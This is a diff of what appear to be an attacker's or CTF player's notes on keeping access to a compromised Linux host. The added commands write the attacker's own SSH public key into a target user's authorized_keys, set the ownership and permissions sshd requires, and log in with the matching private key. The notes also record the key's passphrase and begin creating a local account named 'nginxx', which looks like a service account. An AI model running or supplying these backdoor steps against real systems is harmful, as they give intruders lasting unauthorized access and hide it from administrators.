@@ -7,11 +7,17 @@ ssh-keygen
 ## pubkey [paste in remote /home/user/.ssh/authorized_keys.]
 ## passphrase --> cyber
 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVAVvQFVGiNGuhlfXeLgA9+rwkzG3YOMAz5efIlM97edEOobq6qLHZJN3V5MrAy4GXZ01slEKMgRoBwyv9WYB67KMDt/a4L2G5YLUwQQsP1Ht8kVimTxuZ00oq52M+22V1a9wcY2XV9Soj1g0FAzSwloH4xy5tf0GcT68PZ3c4mpAnrGFTk3HoTHZaNqidQDI1EnVRRLrwPX3m1FtKf90vKSo9zzKd3r52uk2tEvr6WOTEHzEV+JEgKoFIME/FlH2Qt95LXEpTDYjfjEcEkPEx37J+buyNW46+IbSLgKWqJ3SeIuYaoc1h5VpGre4fqD4Wg85gOSfvt6g+5/MfuKCAwvIM6k/Ux1np3/ZHWc4Opv8eyVSk2/4QliHBN6diK1laeRPOqd0vcBfCR2tRXIgQGcoGtqycli9jWmNGIZcn8RufLcJOP2zAK6wDlSpqG2VdgK1po48g9JgsbK5VpG3qBbRM2As2tYyGFcCef/q7S14T95iP3bf0F+0gkBbsMsM= cyberxploit@parrot" > authorized_keys
+chmod 700 /home/user/.ssh
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVAVvQFVGiNGuhlfXeLgA9+rwkzG3YOMAz5efIlM97edEOobq6qLHZJN3V5MrAy4GXZ01slEKMgRoBwyv9WYB67KMDt/a4L2G5YLUwQQsP1Ht8kVimTxuZ00oq52M+22V1a9wcY2XV9Soj1g0FAzSwloH4xy5tf0GcT68PZ3c4mpAnrGFTk3HoTHZaNqidQDI1EnVRRLrwPX3m1FtKf90vKSo9zzKd3r52uk2tEvr6WOTEHzEV+JEgKoFIME/FlH2Qt95LXEpTDYjfjEcEkPEx37J+buyNW46+IbSLgKWqJ3SeIuYaoc1h5VpGre4fqD4Wg85gOSfvt6g+5/MfuKCAwvIM6k/Ux1np3/ZHWc4Opv8eyVSk2/4QliHBN6diK1laeRPOqd0vcBfCR2tRXIgQGcoGtqycli9jWmNGIZcn8RufLcJOP2zAK6wDlSpqG2VdgK1po48g9JgsbK5VpG3qBbRM2As2tYyGFcCef/q7S14T95iP3bf0F+0gkBbsMsM= cyberxploit@parrot" >> authorized_keys
+
+chown -R user:user /home/user/.ssh
+chmod 600 /home/user/.ssh/authorized_keys
+
+# locally will now ssh in
+ssh -i /home/cyberxploit/.ssh/id_rsa user@target
 
 
-chmod 700 /root/.ssh
-chmod 600 /user/.ssh/authorized_keys
 
 --> Local Priviledged User
 useradd -m -s /bin/bash nginxx
